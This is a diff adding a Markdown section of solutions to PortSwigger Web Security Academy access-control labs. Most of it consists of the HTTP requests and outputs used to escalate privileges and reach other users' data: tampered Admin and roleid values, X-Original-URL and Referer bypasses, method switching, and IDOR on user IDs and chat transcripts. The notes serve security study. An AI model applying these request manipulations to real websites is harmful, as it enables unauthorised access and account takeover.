@@ -1498,9 +1498,336 @@
 
 ---
 
-<!--
-## **Access Control**
+## **[Access Control][access_control]**
 
+1. #### **Unprotected admin functionality**
+
+    - Look at the **robots.txt** and **sitemap.xml** files.
+
+    ```plaintext
+    User-agent: *
+    Disallow: /administrator-panel
+    ```
+
+    - Access the URL **/administrator-panel** exposed in the **robots.txt** file.
+
+    ```plaintext
+    https://<lab_url>/administrator-panel
+    https://<lab_url>/administrator-panel/delete?username=carlos
+    ```
+
+2. #### **Unprotected admin functionality with unpredictable URL**
+
+    - Look at the page source code.
+
+    ```javascript
+    ...
+    var isAdmin = false;
+    if (isAdmin) {
+        var topLinksTag = document.getElementsByClassName("top-links")[0];
+        var adminPanelTag = document.createElement('a');
+        adminPanelTag.setAttribute('href', '/admin-b5x8jc');
+        adminPanelTag.innerText = 'Admin panel';
+        topLinksTag.append(adminPanelTag);
+        var pTag = document.createElement('p');
+        pTag.innerText = '|';
+        topLinksTag.appendChild(pTag);
+    }
+    ...
+    ```
+
+    - Access the exposed URL **/admin-b5x8jc**.
+
+    ```plaintext
+    https://<lab_url>/admin-b5x8jc
+    https://<lab_url>/admin-b5x8jc/delete?username=carlos
+    ```
+
+3. #### **User role controlled by request parameter**
+
+    - Login and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/login         POST    (csrf=...&username=wiener&password=peter)
+    https://<lab_url>/my-account    GET     (Cookie: session=...; Admin=false)
+    ...
+    ```
+
+    - Try to access to **/admin**, the message  
+    ***Admin interface only available if logged in as an administrator*** will appear.
+    - Send the **/admin GET** request to the **Repeater**.
+    - Set the **Admin** cookie to **true** and repeat the request.
+
+    ```plaintext
+    https://<lab_url>/admin                             GET     401 Unauthorized    (Cookie: session...; Admin=false)
+
+    https://<lab_url>/admin                             GET     200 OK              (Cookie: session...; Admin=true)
+    https://<lab_url>/admin/delete?username=carlos
+    ```
+
+4. #### **User role can be modified in user profile**
+
+    - Login and try to access to **/admin**, the message  
+    ***Admin interface only available to local users*** will appear.
+    - Update your email and take note of the URL flow and the parameters sent  
+    (notice that the response leaks the parameter **roleid**).
+
+    ```plaintext
+    ...
+    https://<lab_url>/my-account/change-email           POST    ({"email":"test@test.com"})
+    ...
+    ```
+
+    - Send the **/change-mail POST** request to the **Repeater**.
+    - Add the **roleid** parameter with the value **2** and repeat the request  
+    (notice that in the response, the parameter **roleid** has changed).
+    - Try to access to **/admin** again.
+
+    ```plaintext
+    https://<lab_url>/admin
+    https://<lab_url>/admin/delete?username=carlos
+    ```
+
+5. #### **URL-based access control can be circumvented**
+
+    - Try to access to **/admin**, the message  
+    ***Access denied*** will appear.
+    - Send the **/admin GET** request to the **Repeater**.
+    - Remove **admin** from the URL (keep only **/**), add the **X-Original-URL**
+    header with any value and repeat the request, the message  
+    ***Not Found*** will appear (***this indicates that the back-end system is processing the URL from the X-Original-URL header***).
+    - Set the **X-Original-URL** to **/admin** and repeat the request.
+    - Set the **X-Original-URL** to **/admin/delete?username=carlos** and repeat the request, the message  
+    ***Missing parameter 'username'*** will appear.
+    - Remove **?username=carlos** from the header and add it to the URL.
+
+    ```plaintext
+    https://<lab_url>/admin                             GET     403 Forbidden
+
+    https://<lab_url>/                                  GET     404 Not Found   (X-Original-URL: /asdfg)
+    https://<lab_url>/                                  GET     200 OK          (X-Original-URL: /admin)
+    https://<lab_url>/                                  GET     400 Bad Request (X-Original-URL: /admin/delete?username=carlos)
+    https://<lab_url>/?username=carlos                                          (X-Original-URL: /admin/delete)
+    ```
+
+6. #### **Method-based access control can be circumvented**
+
+    - Login as **administrator**, upgrade the user **carlos** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/admin         GET
+    https://<lab_url>/admin-roles   POST    (username=carlos&action=upgrade)
+    ...
+    ```
+
+    - Logout, login as **wiener** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/login/        POST    (username=wiener&password=peter)
+    https://<lab_url>/my-account    GET     (Cookie: session=oThfWMkrZwGocUrabMRikdz8ACevqQFh)
+    ...
+    ```
+
+    - Try to access to **/admin**, the message  
+    ***Admin interface only available if logged in as an administrator*** will appear.
+    - Send the first **/admin-roles POST** request to the **Repeater**.
+    - Set the **session** cookie to the **wiener**'s cookie, set the **username** to **wiener**,
+    **Change request method** and repeat the request.
+
+    ```plaintext
+    https://<lab_url>/admin-roles   GET     (Cookie: session=oThfWMkrZwGocUrabMRikdz8ACevqQFh,
+                                            username=wiener&action=upgrade)
+    ```
+
+7. #### **User ID controlled by request parameter**
+
+    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=wiener)
+    ```
+
+    - Send the **/my-account GET** request to the **Repeater**.
+    - Set the user **id** to **carlos** and repeat the request.
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=carlos)
+
+    D0CkMQ0ES35JORZdDVecVChxKZVmGxuL
+    ```
+
+8. #### **User ID controlled by request parameter, with unpredictable user IDs**
+
+    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=cd88156d-5bab-4e7e-a6d4-f1c0a9fdbec3)
+    ```
+
+    - Send the **/my-account GET** request to the **Repeater**.
+    - Look at the page source code of each of the blog posts.
+
+    ```html
+    postId=1
+        ...
+        ...<a href='/blogs?userId=02246043-bc39-4982-8ed6-643a0c294947'>administrator</a>...
+        ...
+
+    postId=2
+        ...
+        ...<a href='/blogs?userId=cd88156d-5bab-4e7e-a6d4-f1c0a9fdbec3'>wiener</a>...
+        ...
+
+    postId=3
+        ...
+        ...<a href='/blogs?userId=6070861f-8d1e-420d-85e4-44ba24f1f118'>carlos</a>...
+        ...
+
+    ```
+
+    - Set the user **id** to the **carlos**'s **id** and repeat the request.
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=070861f-8d1e-420d-85e4-44ba24f1f118)
+
+    Your API Key is:    uDu438H9xfPjDfUfGMP2Hizv1LLmV4ld
+    ```
+
+9. #### **User ID controlled by request parameter with data leakage in redirect**
+
+    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=wiener)
+    ```
+
+    - Send the **/my-account GET** request to the **Repeater**.
+    - Set the user **id** to **carlos** and repeat the request  
+    (notice that the **carlos**'s profile page is displayed before the redirect).
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=carlos)
+
+    Your API Key is: zuM25r4y1Hm88aqakr19Dv3sKg3aMpRO
+    ```
+
+10. #### **User ID controlled by request parameter with password disclosure**
+
+    - Login as **wiener**, click **My account** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    https://<lab_url>/my-account    GET     (id=wiener)
+    ```
+
+    - Send the **/my-account GET** request to the **Repeater**.
+    - Set the user **id** to **administrator** and repeat the request.
+
+    ```html
+    ...
+    <input required type=password name=password value='xr21jnqtnj37s2fz41h6'/>
+    ...
+    ```
+
+11. #### **Insecure direct object references**
+
+    - Interact with the **Live chat** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/download-transcript               POST
+    https://<lab_url>/download-transcript/2.txt         GET
+    ...
+    ```
+
+    - Send the **/download-transcript/2.txt GET** request to the **Repeater**.
+    - Set the **txt** filename to **1.txt** and repeat the request.
+
+    ```plaintext
+    CONNECTED: -- Now chatting with Hal Pline --
+    You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
+    Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
+    You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
+    Hal Pline: Takes one to know one
+    You: Ok so my password is m8zm935rsbzfy61lhgo8. Is that right?
+    Hal Pline: Yes it is!
+    You: Ok thanks, bye!
+    Hal Pline: Do one!
+    ```
+
+12. #### **Multi-step process with no access control on one step**
+
+    - Login as **administrator**, upgrade the user **carlos** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/admin         GET
+    https://<lab_url>/admin-roles   POST    (username=carlos&action=upgrade)
+    https://<lab_url>/admin-roles   POST    (action=upgrade&confirmed=true&username=carlos)
+    ...
+    ```
+
+    - Logout, login as **wiener** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/login/        POST    (username=wiener&password=peter)
+    https://<lab_url>/my-account    GET     (Cookie: session=3DXvIkJ1NEBa0QqtVqK0ja6uly3MOsk8)
+    ...
+    ```
+
+    - Try to access to **/admin**, the message  
+    ***Admin interface only available if logged in as an administrator*** will appear.
+    - Send the first (confirmed) **/admin-roles POST** request to the **Repeater**.
+    - Set the **session** cookie to the **wiener**'s cookie,
+    set the **username** to **wiener** and repeat the request.
+
+    ```plaintext
+    https://<lab_url>/admin-roles   POST    (Cookie: session=3DXvIkJ1NEBa0QqtVqK0ja6uly3MOsk8,
+                                            action=upgrade&confirmed=true&username=wiener)
+    ```
+
+13. #### **Referer-based access control**
+
+    > 📝 **Note:**
+    <mark>Although this lab looks the same as the previous one, it's different:
+    If you remove the **Referer** header, it doesn't works.  
+    This is because ***Some websites base access controls on the Referer header submitted in the HTTP request.***.</mark>
+
+    - Login as **administrator**, upgrade the user **carlos** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    ...
+    https://<lab_url>/admin         GET
+    https://<lab_url>/admin-roles   GET     (username=carlos&action=upgrade)
+    ...
+    ```
+
+    - Logout, login as **wiener** and take note of the URL flow and the parameters sent.
+
+    ```plaintext
+    https://<lab_url>/login/        POST    (username=wiener&password=peter)
+    https://<lab_url>/my-account    GET     (Cookie: session=J0rtlZCXo6I23lQleAqEBTiBRc4C4Ybw)
+    ```
+
+    - Try to access to **/admin**, the message  
+    ***Admin interface only available if logged in as an administrator*** will appear.
+    - Send the first **/admin-roles GET** request to the **Repeater**.
+    - Set **session** cookie to the **wiener**'s cookie,
+    set the **username** to **wiener** and repeat the request  
+
+    ```plaintext
+    https://<lab_url>/admin-roles   GET     (Cookie: session=J0rtlZCXo6I23lQleAqEBTiBRc4C4Ybw,
+                                            username=wiener&action=upgrade)
+    ```
+
+[access_control]: https://portswigger.net/web-security/access-control
+
+---
+
+<!--
 ## **File Upload Vulnerabilities**
 -->
 
